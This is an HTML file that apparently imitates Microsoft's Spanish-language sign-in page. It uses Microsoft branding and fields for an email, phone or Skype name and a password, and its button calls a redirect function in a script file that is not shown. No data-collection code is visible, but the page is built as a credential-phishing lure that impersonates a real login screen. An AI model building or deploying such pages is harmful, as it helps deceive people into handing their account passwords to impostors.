<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <link rel="stylesheet" href="styles.css">
</head>

<body>


    <div class="d-flex justify-content-center align-items-center vh-100">
        <div class="form-container">
            <div class=" img-container d-flex align-items-center">
                <img src="logo.png" alt="">
                <p class="microsoft">Microsoft</p>
            </div>
            <p style="font-size: 1.3rem; font-weight: 600; margin: 0;">Iniciar sesión</p>
            <form>
                <div class="form-group">
                    <input type="email" class="form-control" id="email" name="email"
                        placeholder="Correo electrónico, teléfono o Skype">
                </div>
                <div class="form-group">
                    <input type="password" class="form-control" id="password" name="password" placeholder="Contraseña">
                </div>

                <div class="p-container2">
                    <p class="password"><a href="google.com">He olvidado mi contraseña</a></p>
                    <p>¿No tiene una cuenta? <a href="#">Cree una.</a></p>
                    <p><a href="#">¿No puede acceder a su cuenta?</a></p>
                </div>
            </form>
            <div class="d-flex justify-content-end btn-container link">
                <button class="btn btn-primary" onclick="redireccionar()">Iniciar Sesión</button>
            </div>
            <span></span>
        </div>

    </div>






    <script src=" script.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
        integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js"
        integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy"
        crossorigin="anonymous"></script>
</body>

</html>
